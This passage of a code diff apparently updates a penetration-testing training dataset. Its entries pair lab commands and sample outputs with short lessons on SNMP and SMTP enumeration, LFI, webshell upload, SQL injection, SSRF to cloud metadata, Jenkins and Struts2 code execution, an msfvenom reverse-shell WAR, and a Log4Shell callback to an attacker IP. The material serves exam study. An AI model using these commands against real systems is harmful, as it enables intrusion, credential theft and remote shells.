-        '10.10.10.10 [public] HOST-RESOURCES-MIB::hrSWRunName',
-        '10.10.10.10 [public]   "sshd" "apache2" "mysqld"',
+        'Scanning 1 hosts, 3220 communities',
+        '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
       ].join('\n'),
-      signal: '10.10.10.10 [public] Linux dev 5.4.0-91-generic',
-      teach: 'An SNMP community string of "public" is a default nobody changed. With it you can read the host\'s running processes, users, and sometimes credentials straight out of the MIB — no login required.',
+      signal: '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
+      teach: 'An SNMP community string of "public" is a default nobody changed. onesixtyone confirms it answers; with it (via snmpwalk) you can read running processes, users, and sometimes credentials — no login required.',
+    },
+    'recon-ike-vpn': {
+      cmd: 'sudo ike-scan -M 10.10.10.10', tool: 'ike-scan',
+      output: [
+        'Starting ike-scan 1.9.5 with 1 hosts',
+        '10.10.10.10  Main Mode Handshake returned',
+        '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
+        'Ending ike-scan: 1 hosts scanned, 1 returned handshake',
+      ].join('\n'),
+      signal: '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
+      teach: 'An IKE/IPsec VPN on UDP 500 reveals its crypto. A dated 3DES/SHA1/PSK config is a finding on its own, and if the server also allows Aggressive Mode (ike-scan -A) it will hand back a PSK hash you can crack offline.',
+    },
+    'recon-finger': {
+      cmd: 'finger @10.10.10.10', tool: 'finger',
+      output: [
+        'Login     Name          Tty   Idle  Login Time',
+        'root      root          *:0     1d  Mon 09:14',
+        'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
+      ].join('\n'),
+      signal: 'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
+      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in — bmurphy is a confirmed account to spray or brute.',
+    },
+    'recon-vnc': {
+      cmd: 'nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass 10.10.10.10', tool: 'nmap',
+      output: [
+        'PORT     STATE SERVICE',
+        '5900/tcp open  vnc',
+        '| vnc-info:',
+        '|   Protocol version: 3.8',
+        '|   Security types:',
+        '|_    None (1) - no password required',
+      ].join('\n'),
+      signal: '|_    None (1) - no password required',
+      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop — connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable.',
     },
     'recon-smtp': {
+      cmd: 'smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10', tool: 'smtp-user-enum',
       output: [
+        'Starting smtp-user-enum v1.2',
         '10.10.10.10: root exists',
-        '10.10.10.10: admin exists',
-        '10.10.10.10: bob exists',
+        '10.10.10.10: bmurphy exists',
         '10.10.10.10: nonexistent does not exist',
       ].join('\n'),
-      signal: '10.10.10.10: admin exists',
+      signal: '10.10.10.10: bmurphy exists',
       teach: 'An SMTP server that answers VRFY confirms which usernames are real. A confirmed user list is the raw material for a password spray or a brute — you stop guessing names and start guessing passwords.',
     },
-    'rdp-enum': {
+    'recon-ftp': {
+      cmd: "nxc ftp 10.10.10.10 -u anonymous -p ''", tool: 'nxc',
       output: [
-        'RDP         10.10.10.10     3389   TARGET   [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:CORP)',
-        'RDP         10.10.10.10     3389   TARGET   [+] CORP\\bob:Summer2024! (Pwn3d!)',
+        'FTP  10.10.10.10  21  FTP01  [*] Banner: 220 (vsFTPd 3.0.3)',
+        'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
+        'FTP  10.10.10.10  21  FTP01  -rw-r--r-- 1 ftp ftp 1024 Jan 08 09:12 backup.zip',
       ].join('\n'),
-      signal: '[+] CORP\\bob:Summer2024! (Pwn3d!)',
-      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in — you have an interactive desktop waiting. Always confirm which creds work against which service before you commit to a session.',
+      signal: 'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
+      teach: 'Anonymous FTP is a free login — always test it. A readable file like backup.zip often holds source, configs, or credentials; download everything and look through it.',
+    },
+    'recon-mail': {
+      cmd: 'nmap -sV -p 110,143,993,995 --script pop3-capabilities,pop3-ntlm-info 10.10.10.10', tool: 'nmap',
+      output: [
+        'PORT    STATE SERVICE',
+        '110/tcp open  pop3',
+        '143/tcp open  imap',
+        '|_pop3-capabilities: USER TOP UIDL',
+        '| pop3-ntlm-info:',
+        '|_  Domain: ACME',
+      ].join('\n'),
+      signal: '|_  Domain: ACME',
+      teach: 'Mail services leak more than you expect: capabilities, and via NTLM auth the internal domain name (ACME). With a valid mailbox credential you can read mail for secrets, reset links, and internal contacts.',
+    },
+    'rdp-enum': {
+      cmd: "nxc rdp 10.10.10.10 -u bmurphy -p 'Summer2024!'", tool: 'nxc',
+      output: [
+        'RDP  10.10.10.10  3389  TARGET  [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:ACME)',
+        'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
+      ].join('\n'),
+      signal: 'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
+      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in — you have an interactive desktop waiting (connect with xfreerdp). Always confirm which creds work against which service.',
     },
     'nfs-enum': {
+      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
       output: [
         'Export list for 10.10.10.10:',
-        '/srv/home   *',
+        '/srv/home    *',
         '/var/backups 10.10.10.0/24',
       ].join('\n'),
-      signal: '/srv/home   *',
-      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read — and often, with a matching UID, write — other users\' files. A classic foothold and privesc rolled into one.',
+      signal: '/srv/home    *',
+      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read — and often, with a matching UID, write — other users\' files. A classic foothold and privesc in one.',
     },
 
-    // ==================== WEB ====================
+    // ============================ WEB ============================
     'vhost-discovery': {
+      cmd: 'ffuf -u http://10.10.10.10 -H "Host: FUZZ.acme.internal" -w subdomains.txt -mc 200,301,302 -fs 0', tool: 'ffuf',
       output: [
-        'dev                     [Status: 200, Size: 5210, Words: 412]',
-        'staging                 [Status: 200, Size: 1840, Words: 95]',
-        'www                     [Status: 200, Size: 5210, Words: 412]',
+        ':: Method           : GET',
+        'dev                     [Status: 200, Size: 5210, Words: 412, Lines: 98]',
+        'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
       ].join('\n'),
-      signal: 'staging                 [Status: 200, Size: 1840, Words: 95]',
-      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces the ones with no public link — a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
+      signal: 'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
+      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces ones with no public link — a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
+    },
+    'content-discovery': {
+      cmd: 'feroxbuster -u http://10.10.10.10 -w raft-medium-directories.txt -o scans/ferox.txt', tool: 'feroxbuster',
+      output: [
+        '200      GET       24l       68w     /index.php',
+        '301      GET        9l       28w     /uploads => http://10.10.10.10/uploads/',
+        '200      GET       11l       33w     /admin/login.php',
+        '403      GET        9l       28w     /.git',
+      ].join('\n'),
+      signal: '200      GET       11l       33w     /admin/login.php',
+      teach: 'Brute-forcing paths uncovers what is not linked anywhere — an admin login, an uploads directory, a leaking .git. Each hit is a new place to attack; chase the interesting ones (admin, upload, config) first.',
+    },
+    'param-discovery': {
+      cmd: 'arjun -u http://10.10.10.10/view.php -m GET', tool: 'arjun',
+      output: [
+        '[*] Scanning http://10.10.10.10/view.php',
+        '[*] Analysing HTTP response for anomalies',
+        '[+] Parameter detected: page, based on: status code, body length',
+      ].join('\n'),
+      signal: '[+] Parameter detected: page, based on: status code, body length',
+      teach: 'A page can hide inputs that nothing links to. arjun fuzzes parameter names and watches the response change — finding a hidden "page" parameter gives you something to test for LFI, SQLi, or SSRF.',
+    },
+    'lfi-probe': {
+      cmd: "curl -s 'http://10.10.10.10/view.php?page=../../../../etc/passwd'", tool: 'curl',
+      output: [
+        'root:x:0:0:root:/root:/bin/bash',
+        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+        'bmurphy:x:1000:1000:Bob Murphy:/home/bmurphy:/bin/bash',
+      ].join('\n'),
+      signal: 'root:x:0:0:root:/root:/bin/bash',
+      teach: 'When /etc/passwd comes back in the page, the "page" parameter reads arbitrary files — Local File Inclusion. It confirms traversal and leaks real usernames (bmurphy); next you try log poisoning or PHP wrappers for code execution.',
+    },
+    'file-upload': {
+      cmd: 'curl -s -F "file=@shell.php" http://10.10.10.10/upload.php', tool: 'curl',
+      output: [
+        '{"status":"ok","stored":"/uploads/shell.php"}',
+      ].join('\n'),
+      signal: '{"status":"ok","stored":"/uploads/shell.php"}',
+      teach: 'The upload accepted a .php file and told you where it landed. If /uploads/ executes PHP, requesting shell.php runs your code — upload-to-webshell. Many filters are weak (check extension tricks, content-type, magic bytes).',
     },
     'sqli-basics': {
+      cmd: "curl -s 'http://10.10.10.10/page.php?id=1%27'", tool: 'curl',
       output: [
         'You have an error in your SQL syntax; check the manual that',
-        "corresponds to your MySQL server version near '''' at line 1",
+        "corresponds to your MySQL server version for the right syntax near '''",
       ].join('\n'),
       signal: 'You have an error in your SQL syntax; check the manual that',
-      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped — the first proof of SQL injection. From here you confirm the column count and start extracting data.',
+      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped — the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
     },
-    'command-injection': {
+    'sqlmap-automation': {
+      cmd: 'sqlmap -r request.txt --batch --level=3 --risk=2 --dump', tool: 'sqlmap',
       output: [
-        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
-        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
-        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+        "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
+        '[INFO] the back-end DBMS is MySQL',
+        'Database: appdb',
+        'Table: users',
+        '| id | username | password                         |',
+        '| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |',
       ].join('\n'),
-      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
-      teach: 'The app ran your `;id` alongside its ping — the `uid=www-data` line is the web server executing your command. That is command injection, and it is a direct path to a shell as the web user.',
+      signal: "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
+      teach: 'Once you have confirmed injection by hand, sqlmap automates the extraction — it enumerates databases, tables, and dumps rows. Those password hashes go straight to your cracker. Use -r with a saved request so it tests the real parameters.',
+    },
+    'git-exposed': {
+      cmd: 'git-dumper http://10.10.10.10/.git/ gitloot', tool: 'git-dumper',
+      output: [
+        '[+] Testing http://10.10.10.10/.git/HEAD [200]',
+        '[+] Fetching .git/ ...',
+        '[+] Running git checkout .',
+        'Repository reconstructed in gitloot/',
+        'config.php:  $db_pass = "SourceOnly2026!";',
+      ].join('\n'),
+      signal: 'config.php:  $db_pass = "SourceOnly2026!";',
+      teach: 'An exposed .git/ directory lets git-dumper reconstruct the whole source tree — including secrets committed by mistake. A database password in config.php is a free credential and a read of exactly how the app works.',
+    },
+    'svn-exposed': {
+      cmd: 'curl -s http://10.10.10.10/.svn/entries', tool: 'curl',
+      output: [
+        '10',
+        'dir',
+        'https://svn.acme.internal/app',
+        'config.php',
+        'db_connect.php',
+      ].join('\n'),
+      signal: 'db_connect.php',
+      teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames — db_connect.php likely holds database credentials. Reconstruct the files and read them.',
+    },
+    'ssrf': {
+      cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
+      output: [
+        '{',
+        '  "AccessKeyId": "AKIAEXAMPLE123",',
+        '  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLEKEY",',
+        '  "Token": "IQoJb3JpZ2luX2VjE..."',
+        '}',
+      ].join('\n'),
+      signal: '  "AccessKeyId": "AKIAEXAMPLE123",',
+      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at the cloud metadata endpoint (169.254.169.254) it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
     },
     'ssti': {
+      cmd: "curl -s 'http://10.10.10.10/hello?user={{7*7}}'", tool: 'curl',
       output: [
-        'Hello 49',
+        '<h1>Hello 49</h1>',
       ].join('\n'),
-      signal: 'Hello 49',
-      teach: 'You sent `{{7*7}}` and the page returned `49` — the template engine evaluated your input instead of printing it. Server-side template injection often escalates straight to remote code execution.',
+      signal: '<h1>Hello 49</h1>',
+      teach: 'You sent {{7*7}} and the page returned 49 — the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
+    },
+    'xxe': {
+      cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
+      output: [
+        '<result>',
+        'root:x:0:0:root:/root:/bin/bash',
+        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+        '</result>',
+      ].join('\n'),
+      signal: 'root:x:0:0:root:/root:/bin/bash',
+      teach: 'XML External Entity injection abuses a parser that resolves external entities. Your payload declares one pointing at file:///etc/passwd and the response echoes the file back. Any endpoint that accepts XML is worth testing.',
+    },
+    'deserialization': {
+      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
+      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob — the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
+      steps: [
+        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'local', tool: 'curl', cmd: 'curl -s -X POST http://10.10.10.10/api --data-binary @cc5-payload.bin', output: [
+          '↩ the app deserialised it and ran your gadget — caught on your listener:',
+          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
+          'uid=0(root) gid=0(root) groups=0(root)',
+        ].join('\n') },
+      ],
+    },
+    'jwt-attacks': {
+      cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
+      output: [
+        '{"user":"guest","role":"user","iat":1700000000}',
+      ].join('\n'),
+      signal: '{"user":"guest","role":"user","iat":1700000000}',
+      teach: 'Decode the token first — the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
+    },
+    'nosql-injection': {
+      cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
+      output: [
+        'HTTP/1.1 302 Found',
+        'Location: /dashboard',
+        'Set-Cookie: session=loggedin-as-admin; Path=/',
+      ].join('\n'),
+      signal: 'Set-Cookie: session=loggedin-as-admin; Path=/',
+      teach: 'NoSQL backends like MongoDB take query operators as input. {"$ne":"x"} means "not equal to x" — always true — so the login matches the first user and you are in without a password. Test JSON and array parameters against NoSQL apps.',
+    },
+    'tomcat-deploy': {
+      signal: 'OK - Deployed application at context path [/shell]',
+      teach: 'Tomcat Manager with valid creds lets you deploy a WAR — your own app — which runs as the Tomcat service account. First build the WAR on your box, then upload it; "OK - Deployed" means your JSP shell is live at /shell. Request it to get code execution.',
+      steps: [
+        { where: 'local', tool: 'msfvenom', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o rev.war', output: [
+          'Payload size: 1098 bytes',
+          'Final size of war file: 1098 bytes',
+          'Saved as: rev.war',
+        ].join('\n') },
+        { where: 'local', tool: 'curl', cmd: "curl -u 'tomcat:s3cret' 'http://10.10.10.10:8080/manager/text/deploy?path=/shell' --upload-file rev.war", output: 'OK - Deployed application at context path [/shell]' },
+      ],
+    },
+    'jenkins-access': {
+      cmd: "curl -s http://10.10.10.10:8080/script --data-urlencode 'script=println \"id\".execute().text'", tool: 'curl',
+      output: [
+        'uid=0(root) gid=0(root) groups=0(root)',
+      ].join('\n'),
+      signal: 'uid=0(root) gid=0(root) groups=0(root)',
+      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service — often root or a privileged build account. If /script is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run privileged.',
+    },
+    'wordpress': {
+      cmd: 'wpscan --url http://10.10.10.10 --enumerate u,vp --api-token $WPSCAN_API', tool: 'wpscan',
+      output: [
+        '[+] URL: http://10.10.10.10/  [10.10.10.10]',
+        '[+] WordPress version 5.8.1 identified',
+        '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
+        '[i] User(s) Identified: admin, editor',
+      ].join('\n'),
+      signal: '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
+      teach: 'wpscan maps a WordPress site: core version, plugins, and users. Plugins are where WordPress boxes fall — a vulnerable one like wp-file-manager is often a direct RCE. The enumerated users feed a login brute if you need one.',
     },
     'nikto-scan': {
+      cmd: 'nikto -h http://10.10.10.10 -o scans/nikto.txt', tool: 'nikto',
       output: [
         '+ Server: Apache/2.4.49 (Unix)',
         '+ /admin/: This might be interesting.',
@@ -571,129 +400,1030 @@
         '+ /cgi-bin/: Directory indexing found.',
       ].join('\n'),
       signal: '+ /admin/: This might be interesting.',
-      teach: 'Nikto is a fast first pass that flags the obvious — default files, an exposed /admin, a dated server banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
+      teach: 'Nikto is a fast first pass that flags the obvious — default files, an exposed /admin, a dated banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
     },
-    'tomcat-deploy': {
+    'command-injection': {
+      cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
       output: [
-        'OK - Deployed application at context path [/shell]',
-        '$ curl http://10.10.10.10:8080/shell/',
-        'uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)',
+        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
+        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
+        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
       ].join('\n'),
-      signal: 'OK - Deployed application at context path [/shell]',
-      teach: 'Tomcat Manager with valid creds lets you deploy a WAR — your own app — which runs as the Tomcat service account. Deploying a JSP shell is the standard route from "I can log into Manager" to code execution.',
+      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      teach: 'The app ran your ;id alongside its ping — the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
     },
-
-    // ==================== SERVICE & WEB CHECKS ====================
-    'check-http-methods': {
+    'idor': {
+      cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
+      output: [
+        '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
+        ' "role":"customer","card_last4":"4417","balance":"42.10"}',
+      ].join('\n'),
+      signal: '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
+      teach: 'You changed id=1001 (yours) to id=1002 and got someone else\'s record — an Insecure Direct Object Reference. The app checks that you are logged in, but not that the object is yours. Walk the IDs to harvest other users\' data.',
+    },
+    'verb-tampering': {
+      cmd: 'curl -s -X OPTIONS -i http://10.10.10.10/admin/', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
-        'Allow: GET, POST, PUT, DELETE, OPTIONS',
+        'Allow: GET, POST, PUT, OPTIONS',
       ].join('\n'),
-      signal: 'Allow: GET, POST, PUT, DELETE, OPTIONS',
-      teach: 'OPTIONS tells you what verbs the server accepts. PUT or DELETE in the list is a red flag — PUT can mean you upload a web shell directly, no injection needed.',
+      signal: 'Allow: GET, POST, PUT, OPTIONS',
+      teach: 'OPTIONS tells you which verbs the server accepts. PUT in the list on /admin/ is a red flag — you may be able to upload a web shell with a PUT, no injection needed. Enumerate methods before assuming a path is locked down.',
+    },
+    'web-shells': {
+      cmd: "curl -s 'http://10.10.10.10/uploads/cmd.php?c=id'", tool: 'curl',
+      output: [
+        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      ].join('\n'),
+      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      teach: 'Once your uploaded web shell runs commands (?c=id returns www-data), you have code execution — but one command per request is clumsy. The very next move is to turn it into a proper interactive reverse shell.',
+    },
+    'xss-basics': {
+      cmd: "curl -s 'http://10.10.10.10/search.php?q=<b>xssprobe123</b>'", tool: 'curl',
+      output: [
+        '<p>No results for <b>xssprobe123</b></p>',
+      ].join('\n'),
+      signal: '<p>No results for <b>xssprobe123</b></p>',
+      teach: 'Your <b> tag came back rendered, not escaped — the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing a session. On OSCP it matters most where it can reach an admin.',
+    },
+    'check-log4shell': {
+      signal: 'Received LDAP query from 10.10.10.10 for object /a',
+      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your ${jndi:ldap://...} string and dutifully connects out to it. Stand up a listener first, then inject the string — the inbound LDAP hit confirms the callback, the first step before staging a full exploit.',
+      steps: [
+        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 1389', output: 'Listening on 0.0.0.0 1389' },
+        { where: 'local', tool: 'curl', cmd: "curl -sSkL http://10.10.10.10/ -H 'User-Agent: ${jndi:ldap://10.10.14.5:1389/a}'", output: [
+          '↩ the target logged the string and connected back:',
+          'Received LDAP query from 10.10.10.10 for object /a',
+        ].join('\n') },
+      ],
+    },
+    'check-struts2': {
+      cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
+      output: [
+        'uid=0(root) gid=0(root) groups=0(root)',
+      ].join('\n'),
+      signal: 'uid=0(root) gid=0(root) groups=0(root)',
+      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates an attacker expression in the Content-Type header and runs commands — here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
+    },
+
+    // ============================ SERVICE & WEB CHECKS ============================
+    'check-tls-config': {
+      cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10', tool: 'nmap',
+      output: [
+        '| ssl-cert: Subject: commonName=dev.acme.internal',
+        '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
+        '|_  Not valid after:  2025-11-01T00:00:00',
+        '| ssl-enum-ciphers:',
+        '|_  TLSv1.0: (weak)',
+      ].join('\n'),
+      signal: '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
+      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames — like vault.acme.internal — you had no other way to discover. The cipher list and expiry are reporting findings too.',
+    },
+    'check-http-methods': {
+      cmd: 'curl -sSIkLX OPTIONS http://10.10.10.10/', tool: 'curl',
+      output: [
+        'HTTP/1.1 200 OK',
+        'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
+      ].join('\n'),
+      signal: 'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
+      teach: 'OPTIONS reports which verbs the server accepts. PUT or DELETE in the list is a red flag — PUT can mean you upload a web shell directly, no injection needed.',
+    },
+    'check-cors': {
+      cmd: 'curl -sSIkL -H "Origin: https://evil.example" http://10.10.10.10/api/me', tool: 'curl',
+      output: [
+        'HTTP/1.1 200 OK',
+        'Access-Control-Allow-Origin: https://evil.example',
+        'Access-Control-Allow-Credentials: true',
+      ].join('\n'),
+      signal: 'Access-Control-Allow-Origin: https://evil.example',
+      teach: 'The server reflected your arbitrary Origin AND allows credentials — a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous pair.',
+    },
+    'check-http-redirect': {
+      cmd: 'curl -sSIk http://10.10.10.10/', tool: 'curl',
+      output: [
+        'HTTP/1.1 301 Moved Permanently',
+        'Location: https://dev-internal.acme.internal/',
+      ].join('\n'),
+      signal: 'Location: https://dev-internal.acme.internal/',
+      teach: 'A redirect can leak an internal hostname in its Location header — dev-internal.acme.internal is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
+    },
+    'check-subdomain-takeover': {
+      cmd: 'dig +noall +answer CNAME shop.acme.internal', tool: 'dig',
+      output: [
+        'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
+      ].join('\n'),
+      signal: 'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
+      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. Confirm by visiting it and seeing an unclaimed-app page.',
+    },
+    'check-dns-email': {
+      cmd: 'dig +short TXT _dmarc.acme.internal', tool: 'dig',
+      output: [
+        '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
+      ].join('\n'),
+      signal: '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
+      teach: 'Email records say whether a domain can be spoofed. DMARC p=none means forged mail from this domain is unlikely to be rejected — a phishing lead in a real engagement, a reporting finding on the exam.',
+    },
+    'check-web-headers': {
+      cmd: 'curl -sSIkL http://10.10.10.10/', tool: 'curl',
+      output: [
+        'HTTP/1.1 200 OK',
+        'Server: Apache/2.4.49 (Unix)',
+        'X-Powered-By: PHP/7.4.3',
+        '# (no Content-Security-Policy, no X-Frame-Options)',
+      ].join('\n'),
+      signal: 'X-Powered-By: PHP/7.4.3',
+      teach: 'Response headers hand you the stack for free and show what protections are missing. X-Powered-By leaks the PHP version; the absence of CSP and X-Frame-Options are reporting findings. Read the headers before anything clever.',
+    },
+    'check-web-components': {
+      cmd: 'curl -sSikL http://10.10.10.10/', tool: 'curl',
+      output: [
+        'HTTP/1.1 200 OK',
+        'Server: Apache/2.4.49 (Unix)',
+        'Set-Cookie: PHPSESSID=8f2...; path=/',
+        '<meta name="generator" content="Joomla! 3.9">',
+      ].join('\n'),
+      signal: '<meta name="generator" content="Joomla! 3.9">',
+      teach: 'Between the headers and the page body, the component stack is usually visible — here a generator meta tag names Joomla 3.9. A pinned CMS version maps straight to known exploits; identify it before you attack.',
+    },
+    'check-cms-version': {
+      cmd: 'curl -sSkL http://10.10.10.10/CHANGELOG.txt', tool: 'curl',
+      output: [
+        'Drupal 7.57, 2018-02-21',
+        '----------------------',
+      ].join('\n'),
+      signal: 'Drupal 7.57, 2018-02-21',
+      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2, CVE-2018-7600). Identify the CMS and its exact build, then look up what breaks it.',
+    },
+    'check-web-body': {
+      cmd: 'curl -sSkL http://10.10.10.10/', tool: 'curl',
+      output: [
+        '<form action="/login.php" method="post">',
+        '<!-- TODO: remove test login test/test before go-live -->',
+        '</form>',
+      ].join('\n'),
+      signal: '<!-- TODO: remove test login test/test before go-live -->',
+      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A test/test login left in a comment is a free set of working credentials — read the page humans never read.',
     },
     'check-exposed-files': {
+      cmd: 'curl -sSkL http://10.10.10.10/.env', tool: 'curl',
       output: [
-        '$ curl -s http://10.10.10.10/.git/HEAD',
-        'ref: refs/heads/master',
-        '$ curl -s http://10.10.10.10/.env',
+        'APP_ENV=production',
+        'DB_HOST=127.0.0.1',
         'DB_PASSWORD=sup3rs3cret',
       ].join('\n'),
       signal: 'DB_PASSWORD=sup3rs3cret',
-      teach: 'An exposed `.git/` lets you reconstruct the whole source; a readable `.env` leaks secrets outright. Developers leave these behind constantly — always probe for them before anything clever.',
-    },
-    'check-tls-config': {
-      output: [
-        '| ssl-cert: Subject: commonName=dev.corp.local',
-        '| Subject Alternative Name: DNS:dev.corp.local, DNS:vault.corp.local',
-        '|_  Not valid after:  2025-11-01T00:00:00',
-      ].join('\n'),
-      signal: 'Subject Alternative Name: DNS:dev.corp.local, DNS:vault.corp.local',
-      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames — like `vault.corp.local` — that you had no other way to discover. Add them to your target list.',
+      teach: 'Framework apps keep secrets in a .env file that should never be web-reachable. When it is, it leaks database and API credentials outright. Always probe for .env, .git/HEAD, and server-status before anything else.',
     },
 
-    // ==================== ACTIVE DIRECTORY ====================
-    'eternalblue': {
+    // ============================ ACTIVE DIRECTORY ============================
+    'ad-dc-identify': {
+      cmd: "nxc ldap 10.10.10.10 -u '' -p ''", tool: 'nxc',
       output: [
-        'Host script results:',
-        '| smb-vuln-ms17-010:',
-        '|   VULNERABLE: Remote Code Execution vulnerability in SMBv1 (ms17-010)',
-        '|_    State: VULNERABLE',
+        'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
+        'LDAP  10.10.10.10  389  DC01  [+] Anonymous bind to LDAP succeeded',
+        'LDAP  10.10.10.10  389  DC01  [*] Base DN: DC=acme,DC=internal',
       ].join('\n'),
-      signal: '|_    State: VULNERABLE',
